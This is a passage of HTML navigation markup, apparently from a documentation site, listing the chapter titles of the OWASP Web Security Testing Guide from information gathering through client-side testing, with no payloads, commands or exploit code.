      <a href="../OWASP/WSTG-INFO-02/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1.2. Fingerpring Web server
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INFO-03/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1.3. Review Webserver Metafiles for Information Leakage
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INFO-04/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1.4. Enumerate Applications on Webserver
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INFO-05/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1.5. Review Webpage content for Information Leakage
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INFO-06/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1.6. Identify Application Entry Points
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INFO-07/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1.7. Map Execution Paths through applications
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INFO-08/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1.8. Fingerprint Web Application Framework
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INFO-09/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1.9. Fingerprint Web Applications
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INFO-10/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    1.10. Map Application architecture
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1_3" >
        
          
          <label class="md-nav__link" for="__nav_7_1_3" id="__nav_7_1_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    2.Configuration and Deployment Management Testing
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_1_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_1_3">
            <span class="md-nav__icon md-icon"></span>
            2.Configuration and Deployment Management Testing
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CONF-01/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2.1. Test Network Infrastructure Configuration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CONF-02/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2.2. Test Application Platform Configuration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CONF-03/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2.3. Test File Extensions Handling for Sensitive Information
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CONF-04/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2.4. Review Old Backup and Unreferenced Files for Sensitive Information
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CONF-05/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2.5. Enumerate Infrastructure and Application Admin Interfaces
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CONF-06/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2.6. Test HTTP Methods
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CONF-07/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2.7. Test HTTP Strict Transport Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CONF-08/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2.8. Test RIA Cross Domain Policy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CONF-09/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2.9. Test File Permission
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CONF-10/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2.10. Test for Subdomain Takeover
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CONF-11/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2.11. Test Cloud Storage
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CONF-12/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2.12. Testing for Content Security Policy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CONF-13/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    2.13. Test Path Confusion
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1_4" >
        
          
          <label class="md-nav__link" for="__nav_7_1_4" id="__nav_7_1_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    3.Identity Management Testing
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_1_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_1_4">
            <span class="md-nav__icon md-icon"></span>
            3.Identity Management Testing
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-IDNT-01/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    3.1. Test Role Definitions
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-IDNT-02/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    3.2. Test User Registration Process
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-IDNT-03/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    3.3. Test Account Provisioning Process
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-IDNT-04/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    3.4. Testing for Account Enumeration and Guessable User Account
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-IDNT-05/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    3.5. Testing for Weak or Unenforced Username Policy
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1_5" >
        
          
          <label class="md-nav__link" for="__nav_7_1_5" id="__nav_7_1_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    4.Authentication Testing
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_1_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_1_5">
            <span class="md-nav__icon md-icon"></span>
            4.Authentication Testing
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHN-01/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    4.1. Testing for Credentials Transported over an Encrypted Channel
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHN-02/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    4.2. Testing for Default Credentials
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHN-03/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    4.3. Testing for Weak Lock Out Mechanism
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHN-04/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    4.4. Testing for Bypassing Authentication Schema
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHN-05/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    4.5. Testing for Vulnerable Remember Password
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHN-06/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    4.6. Testing for Browser Cache Weaknesses
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHN-07/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    4.7. Testing for Weak Password Policy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHN-08/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    4.8. Testing for Weak Security Question Answer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHN-09/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    4.9. Testing for Weak Password Change or Reset Functionalities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHN-10/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    4.10. Testing for Weaker Authentication in Alternative Channel
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHN-11/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    4.11. Testing Multi-Factor Authentication (MFA)
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1_6" >
        
          
          <label class="md-nav__link" for="__nav_7_1_6" id="__nav_7_1_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    5.Authorization Testing
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_1_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_1_6">
            <span class="md-nav__icon md-icon"></span>
            5.Authorization Testing
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHZ-01/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    5.1. Testing Directory Traversal File Include
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHZ-02/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    5.2. Testing for Bypassing Authorization Schema
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHZ-03/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    5.3. Testing for Privilege Escalation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHZ-04/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    5.4. Testing for Insecure Direct Object References
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ATHZ-05/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    5.5. Testing for OAuth Weaknesses
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1_7" >
        
          
          <label class="md-nav__link" for="__nav_7_1_7" id="__nav_7_1_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    6.Session Management Testing
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_1_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_1_7">
            <span class="md-nav__icon md-icon"></span>
            6.Session Management Testing
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-SESS-01/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    6.1. Testing for Session Management Schema
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-SESS-02/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    6.2. Testing for Cookies Attributes
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-SESS-03/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    6.3. Testing for Session Fixation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-SESS-04/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    6.4. Testing for Exposed Session Variables
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-SESS-05/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    6.5. Testing for Cross Site Request Forgery
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-SESS-06/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    6.6. Testing for Logout Functionality
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-SESS-07/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    6.7. Testing Session Timeout
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-SESS-08/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    6.8. Testing for Session Puzzling
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-SESS-09/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    6.9. Testing for Session Hijacking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-SESS-10/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    6.10. Testing JSON Web Tokens
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1_8" >
        
          
          <label class="md-nav__link" for="__nav_7_1_8" id="__nav_7_1_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    7.Input Validation Testing
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_1_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_1_8">
            <span class="md-nav__icon md-icon"></span>
            7.Input Validation Testing
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-01/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.1. Testing for Reflected Cross Site Scripting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-02/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.2. Testing for Stored Cross Site Scripting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-03/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.3. Testing for HTTP Verb Tampering
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-04/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.4. Testing for HTTP Parameter Pollution
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-05/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.5. Testing for SQL Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-06/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.6. Testing for LDAP Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-07/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.7. Testing for XML Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-08/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.8. Testing for SSI Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-09/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.9. Testing for XPath Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-10/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.10. Testing for IMAP SMTP Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-11/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.11. Testing for Code Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-12/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.12. Testing for Command Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-13/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.13. Testing for Format String Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-14/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.14. Testing for Incubated Vulnerability
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-15/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.15. Testing for HTTP Splitting Smuggling
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-16/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.16. Testing for HTTP Incoming Requests
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-17/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.17. Testing for Host Header Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-18/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.18. Testing for Server-side Template Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-19/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.19. Testing for Server-Side Request Forgery
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-INPV-20/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    7.20. Testing for Mass Assignment
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1_9" >
        
          
          <label class="md-nav__link" for="__nav_7_1_9" id="__nav_7_1_9_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    8.Testing for Error Handling
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_1_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_1_9">
            <span class="md-nav__icon md-icon"></span>
            8.Testing for Error Handling
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ERRH-01/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    8.1. Testing for Improper Error Handling
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-ERRH-02/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    8.2. Testing for Stack Traces
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1_10" >
        
          
          <label class="md-nav__link" for="__nav_7_1_10" id="__nav_7_1_10_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    9.Testing for Weak Cryptography
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_1_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_1_10">
            <span class="md-nav__icon md-icon"></span>
            9.Testing for Weak Cryptography
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CRYP-01/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    9.1. Testing for Weak Transport Layer Security
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CRYP-02/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    9.2. Testing for Padding Oracle
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CRYP-03/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    9.3. Testing for Sensitive Information Sent via Unencrypted Channels
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CRYP-04/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    9.4. Testing for Weak Encryption
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1_11" >
        
          
          <label class="md-nav__link" for="__nav_7_1_11" id="__nav_7_1_11_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    10.Business Logic Testing
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_1_11_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_1_11">
            <span class="md-nav__icon md-icon"></span>
            10.Business Logic Testing
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-BUSL-01/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    10.1. Test Business Logic Data Validation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-BUSL-02/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    10.2. Test Ability to Forge Requests
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-BUSL-03/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    10.3. Test Integrity Checks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-BUSL-04/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    10.4. Test for Process Timing
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-BUSL-05/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    10.5. Test Number of Times a Function Can Be Used Limits
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-BUSL-06/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    10.6. Testing for the Circumvention of Work Flows
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-BUSL-07/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    10.7. Test Defenses Against Application Misuse
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-BUSL-08/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    10.8. Test Upload of Unexpected File Types
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-BUSL-09/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    10.9. Test Upload of Malicious Files
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-BUSL-10/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    10.10. Test Payment functionality
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_1_12" >
        
          
          <label class="md-nav__link" for="__nav_7_1_12" id="__nav_7_1_12_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    11.Client-side Testing
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_1_12_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7_1_12">
            <span class="md-nav__icon md-icon"></span>
            11.Client-side Testing
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CLNT-01/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    11.1. Testing for DOM-Based Cross Site Scripting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CLNT-02/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    11.2. Testing for JavaScript Execution
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OWASP/WSTG-CLNT-03/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    11.3. Testing for HTML Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
